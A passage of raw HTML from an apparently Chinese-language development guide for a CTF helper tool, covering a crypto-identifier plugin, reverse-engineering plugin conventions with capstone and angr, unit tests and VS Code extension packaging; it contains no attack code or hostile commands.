class="keyword">for</span> key_size <span class="keyword">in</span> info.get(<span class="string">&quot;key_sizes&quot;</span>, []):</span><br><span class="line">                <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - key_size + <span class="number">1</span>):</span><br><span class="line">                    candidate = data[offset:offset+key_size]</span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>._is_random_looking(candidate):</span><br><span class="line">                        results[<span class="string">&quot;keys&quot;</span>].append(&#123;</span><br><span class="line">                            <span class="string">&quot;offset&quot;</span>: <span class="built_in">hex</span>(offset),</span><br><span class="line">                            <span class="string">&quot;length&quot;</span>: key_size,</span><br><span class="line">                            <span class="string">&quot;algorithm&quot;</span>: alg,</span><br><span class="line">                            <span class="string">&quot;hex_value&quot;</span>: candidate.<span class="built_in">hex</span>()</span><br><span class="line">                        &#125;)</span><br><span class="line">                        </span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_is_random_looking</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;简单判断数据是否看起来像随机字节（熵值较高）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 计算简单的熵值估计</span></span><br><span class="line">        byte_counts = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">            byte_counts[b] += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 计算非零计数的比例</span></span><br><span class="line">        non_zero = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> byte_counts <span class="keyword">if</span> c &gt; <span class="number">0</span>)</span><br><span class="line">        non_zero_ratio = non_zero / <span class="number">256.0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 随机数据通常有较高比例的非零计数</span></span><br><span class="line">        <span class="keyword">return</span> non_zero_ratio &gt; <span class="number">0.3</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context_json</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行插件逻辑&quot;&quot;&quot;</span></span><br><span class="line">        context = json.loads(context_json)</span><br><span class="line">        input_data = context.get(<span class="string">&quot;InputText&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分析数据</span></span><br><span class="line">        analysis_results = <span class="variable language_">self</span>.AnalyzeData(input_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> analysis_results</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成插件UI界面&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;padding: 15px;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;Crypto Identifier Tool&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Identify potential encryption algorithms and cryptographic artifacts in binary data.&lt;/p&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;div style=&quot;background-color: #f0f0f0; padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 12px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;strong&gt;Detects:&lt;/strong&gt;</span></span><br><span class="line"><span class="string">                &lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;AES, DES, 3DES, Blowfish, RSA encryption algorithms&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;MD5, SHA1, SHA256 hash functions&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Potential encryption keys and IVs&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Hash values of common lengths&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; Enter binary data (raw or hex-encoded) and click &quot;Execute&quot;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="加密算法识别工具插件清单-Plugins-CryptoIdentifierTool-manifest-json"><a href="#加密算法识别工具插件清单-Plugins-CryptoIdentifierTool-manifest-json" class="headerlink" title="加密算法识别工具插件清单 (Plugins/CryptoIdentifierTool/manifest.json)"></a>加密算法识别工具插件清单 (Plugins/CryptoIdentifierTool/manifest.json)</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CryptoIdentifierTool&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identify potential encryption algorithms in binary data&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTF Tool Team&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EntryPoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;pycryptodome==3.18.0&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="六、逆向工程插件开发指南（插件开发规范）"><a href="#六、逆向工程插件开发指南（插件开发规范）" class="headerlink" title="六、逆向工程插件开发指南（插件开发规范）"></a>六、逆向工程插件开发指南（插件开发规范）</h2><h3 id="1-逆向工程插件开发规范"><a href="#1-逆向工程插件开发规范" class="headerlink" title="1. 逆向工程插件开发规范"></a>1. 逆向工程插件开发规范</h3><p>逆向工程类插件是CTF工具的重要组成部分，主要用于二进制分析、漏洞挖掘和恶意代码分析等场景。开发逆向工程插件应遵循以下规范：</p><h4 id="1-1-命名规范"><a href="#1-1-命名规范" class="headerlink" title="1.1 命名规范"></a>1.1 命名规范</h4><ul><li>插件目录名应包含功能关键词，如<code>DisassemblerTool</code>、<code>StringExtractorTool</code></li><li>Python文件使用小写蛇形命名法，如<code>binary_analyzer.py</code></li><li>类名使用帕斯卡命名法，如<code>class DisassemblerPlugin:</code></li></ul><h4 id="1-2-功能设计原则"><a href="#1-2-功能设计原则" class="headerlink" title="1.2 功能设计原则"></a>1.2 功能设计原则</h4><ul><li><strong>单一职责</strong>：每个插件专注于一项核心功能</li><li><strong>性能优先</strong>：二进制分析可能处理大量数据，需优化算法效率</li><li><strong>错误处理</strong>：对无效输入和异常情况进行优雅处理</li><li><strong>扩展性</strong>：预留接口支持多种架构/格式（如支持x86/ARM架构）</li></ul><h4 id="1-3-依赖管理"><a href="#1-3-依赖管理" class="headerlink" title="1.3 依赖管理"></a>1.3 依赖管理</h4><ul><li>优先使用成熟的逆向工程库：<ul><li><code>capstone</code>：多架构反汇编引擎</li><li><code>pyelftools</code>：ELF文件解析</li><li><code>pefile</code>：PE文件解析</li><li><code>pycryptodome</code>：加密算法实现</li><li><code>angr</code>：二进制分析框架</li></ul></li></ul><h3 id="2-逆向工程插件开发流程"><a href="#2-逆向工程插件开发流程" class="headerlink" title="2. 逆向工程插件开发流程"></a>2. 逆向工程插件开发流程</h3><h4 id="2-1-反汇编插件开发步骤"><a href="#2-1-反汇编插件开发步骤" class="headerlink" title="2.1 反汇编插件开发步骤"></a>2.1 反汇编插件开发步骤</h4><ol><li><p><strong>环境准备</strong>：安装capstone库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone==5.0.1</span><br></pre></td></tr></table></figure></li><li><p><strong>核心功能实现</strong>：</p><ul><li>初始化反汇编引擎（选择架构和模式）</li><li>实现数据解析（支持原始字节和十六进制字符串）</li><li>执行反汇编并格式化输出</li><li>设计用户界面展示结果</li></ul></li><li><p><strong>测试用例</strong>：</p><ul><li>使用已知指令序列验证反汇编正确性</li><li>测试多种架构（x86、ARM等）</li><li>验证异常处理机制</li></ul></li></ol><h4 id="2-2-二进制分析插件通用架构"><a href="#2-2-二进制分析插件通用架构" class="headerlink" title="2.2 二进制分析插件通用架构"></a>2.2 二进制分析插件通用架构</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReverseEngineeringPlugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Plugin Name&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Plugin Description&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.dependencies = []</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件，加载依赖库&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 加载必要的库</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Analyze</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;核心分析逻辑&quot;&quot;&quot;</span></span><br><span class="line">        results = &#123;&#125;</span><br><span class="line">        <span class="comment"># 实现分析功能</span></span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行入口，处理输入并返回结果&quot;&quot;&quot;</span></span><br><span class="line">        data = context.get(<span class="string">&quot;InputData&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        results = <span class="variable language_">self</span>.Analyze(data)</span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回插件UI界面HTML&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;div&gt;Plugin UI&lt;/div&gt;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="3-高级逆向功能实现指南"><a href="#3-高级逆向功能实现指南" class="headerlink" title="3. 高级逆向功能实现指南"></a>3. 高级逆向功能实现指南</h3><h4 id="3-1-集成Angr二进制分析框架"><a href="#3-1-集成Angr二进制分析框架" class="headerlink" title="3.1 集成Angr二进制分析框架"></a>3.1 集成Angr二进制分析框架</h4><p>Angr是一个强大的二进制分析框架，可用于符号执行、控制流分析等高级任务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AngrAnalyzerPlugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Angr Analyzer&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Advanced binary analysis using Angr framework&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.project = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LoadBinary</span>(<span class="params">self, binary_data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;加载二进制数据到Angr&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 创建临时文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;temp_binary&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(binary_data)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 创建Angr项目</span></span><br><span class="line">        <span class="variable language_">self</span>.project = angr.Project(<span class="string">&quot;temp_binary&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">FindSymbolicExecutionPaths</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行符号执行寻找可能路径&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.project:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 创建初始状态</span></span><br><span class="line">        state = <span class="variable language_">self</span>.project.factory.entry_state()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建模拟管理器</span></span><br><span class="line">        simgr = <span class="variable language_">self</span>.project.factory.simulation_manager(state)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 探索所有可能路径</span></span><br><span class="line">        simgr.explore()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 返回路径信息</span></span><br><span class="line">        <span class="keyword">return</span> [&#123;<span class="string">&quot;address&quot;</span>: <span class="built_in">hex</span>(path.addr), <span class="string">&quot;size&quot;</span>: path.size&#125; <span class="keyword">for</span> path <span class="keyword">in</span> simgr.deadended]</span><br></pre></td></tr></table></figure><h4 id="3-2-实现交互式反汇编界面"><a href="#3-2-实现交互式反汇编界面" class="headerlink" title="3.2 实现交互式反汇编界面"></a>3.2 实现交互式反汇编界面</h4><p>通过WebView控件实现交互式反汇编界面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建交互式反汇编UI&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;font-family: monospace;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div id=&quot;disasm-controls&quot; style=&quot;margin-bottom: 10px;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;button onclick=&quot;toggleMode()&quot;&gt;Toggle Mode&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;select id=&quot;arch-select&quot; onchange=&quot;changeArch()&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;option value=&quot;x86&quot;&gt;x86&lt;/option&gt;</span></span><br><span class="line"><span class="string">                &lt;option value=&quot;arm&quot;&gt;ARM&lt;/option&gt;</span></span><br><span class="line"><span class="string">            &lt;/select&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div id=&quot;disassembly&quot; style=&quot;white-space: pre; overflow-x: auto; padding: 10px; background-color: #000; color: #fff;&quot;&gt;</span></span><br><span class="line"><span class="string">            ; Disassembly will appear here</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">        // 交互逻辑实现</span></span><br><span class="line"><span class="string">        function toggleMode() &#123;</span></span><br><span class="line"><span class="string">            // 切换显示模式的逻辑</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        function changeArch() &#123;</span></span><br><span class="line"><span class="string">            // 更改架构的逻辑</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="七、测试与调试流程"><a href="#七、测试与调试流程" class="headerlink" title="七、测试与调试流程"></a>七、测试与调试流程</h2><h3 id="1-本地调试配置"><a href="#1-本地调试配置" class="headerlink" title="1. 本地调试配置"></a>1. 本地调试配置</h3><ol><li><strong>设置断点</strong>：在需要调试的代码行左侧点击设置断点</li><li><strong>启动调试</strong>：按下F5或点击VSCode调试面板中的”启动调试”按钮</li><li><strong>调试控制</strong>：<ul><li>F10：单步执行</li><li>F11：进入函数</li><li>Shift+F11：跳出函数</li><li>Shift+F5：停止调试</li><li>Ctrl+Shift+F5：重启调试</li></ul></li></ol><h3 id="2-插件调试方法"><a href="#2-插件调试方法" class="headerlink" title="2. 插件调试方法"></a>2. 插件调试方法</h3><ol><li><p><strong>Python插件调试</strong>：</p><ul><li>在Python代码中添加<code>import debugpy; debugpy.debug_this_thread()</code></li><li>在VSCode中创建Python调试配置，附加到进程</li></ul></li><li><p><strong>插件加载问题排查</strong>：</p><ul><li>检查插件目录结构是否正确</li><li>验证plugin.json清单文件格式和内容</li><li>查看输出窗口中的调试信息</li></ul></li></ol><h3 id="3-单元测试实现"><a href="#3-单元测试实现" class="headerlink" title="3. 单元测试实现"></a>3. 单元测试实现</h3><p>创建<code>Tests</code>目录，添加单元测试项目，示例测试代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.TestTools.UnitTesting;</span><br><span class="line"><span class="keyword">using</span> CTFTool.PluginSystem;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line">[<span class="meta">TestClass</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PluginManagerTests</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">TestMethod</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadPlugin_ValidPythonPlugin_ReturnsTrue</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Arrange</span></span><br><span class="line">        <span class="keyword">var</span> pluginDir = Path.Combine(Directory.GetCurrentDirectory(), <span class="string">&quot;TestPlugins&quot;</span>, <span class="string">&quot;Base64Tool&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> manager = <span class="keyword">new</span> PluginManager();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Act</span></span><br><span class="line">        <span class="keyword">var</span> result = manager.LoadPlugin(pluginDir);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Assert</span></span><br><span class="line">        Assert.IsTrue(result);</span><br><span class="line">        Assert.IsNotNull(manager.GetPlugin(<span class="string">&quot;Base64工具&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    [<span class="meta">TestMethod</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExecutePlugin_Base64Encode_ReturnsEncodedString</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Arrange</span></span><br><span class="line">        <span class="keyword">var</span> pluginDir = Path.Combine(Directory.GetCurrentDirectory(), <span class="string">&quot;TestPlugins&quot;</span>, <span class="string">&quot;Base64Tool&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> manager = <span class="keyword">new</span> PluginManager();</span><br><span class="line">        manager.LoadPlugin(pluginDir);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Act</span></span><br><span class="line">        <span class="keyword">var</span> context = <span class="keyword">new</span> &#123; </span><br><span class="line">            action = <span class="string">&quot;encode&quot;</span>, </span><br><span class="line">            type = <span class="string">&quot;text&quot;</span>, </span><br><span class="line">            data = <span class="string">&quot;test&quot;</span> </span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> result = manager.ExecutePlugin&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;Base64工具&quot;</span>, context);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Assert</span></span><br><span class="line">        Assert.IsNotNull(result);</span><br><span class="line">        Assert.AreEqual(<span class="string">&quot;dGVzdA==&quot;</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="八、打包与发布"><a href="#八、打包与发布" class="headerlink" title="八、打包与发布"></a>八、打包与发布</h2><h3 id="1-生成VSIX扩展包"><a href="#1-生成VSIX扩展包" class="headerlink" title="1. 生成VSIX扩展包"></a>1. 生成VSIX扩展包</h3><ol><li><p><strong>安装VS Code扩展打包工具</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g vsce</span><br></pre></td></tr></table></figure></li><li><p><strong>创建扩展清单文件 (package.json)</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctf-tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;displayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTF Tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;engines&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;vscode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.74.0&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Other&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;activationEvents&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;onCommand:ctftool.start&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./out/extension.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctftool.start&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTF Tool: Start Application&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>打包扩展</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsce package</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-发布到VS-Code市场"><a href="#2-发布到VS-Code市场" class="headerlink" title="2. 发布到VS Code市场"></a>2. 发布到VS Code市场</h3><ol><li><strong>创建发布者账号</strong>：访问<a href="https://marketplace.visualstudio.com/">Visual Studio Marketplace</a>注册账号</li><li><strong>获取个人访问令牌</strong>：在Azure DevOps中创建具有”Marketplace Publish”权限的令牌</li><li><strong>发布扩展</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsce publish -p &lt;your-personal-access-token&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="八、项目依赖与版本控制"><a href="#八、项目依赖与版本控制" class="headerlink" title="八、项目依赖与版本控制"></a>八、项目依赖与版本控制</h2><h3 id="1-依赖版本锁定"><a href="#1-依赖版本锁定" class="headerlink" title="1. 依赖版本锁定"></a>1. 依赖版本锁定</h3><p><strong>requirements.txt</strong>完整内容：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwntools==4.9.0</span><br><span 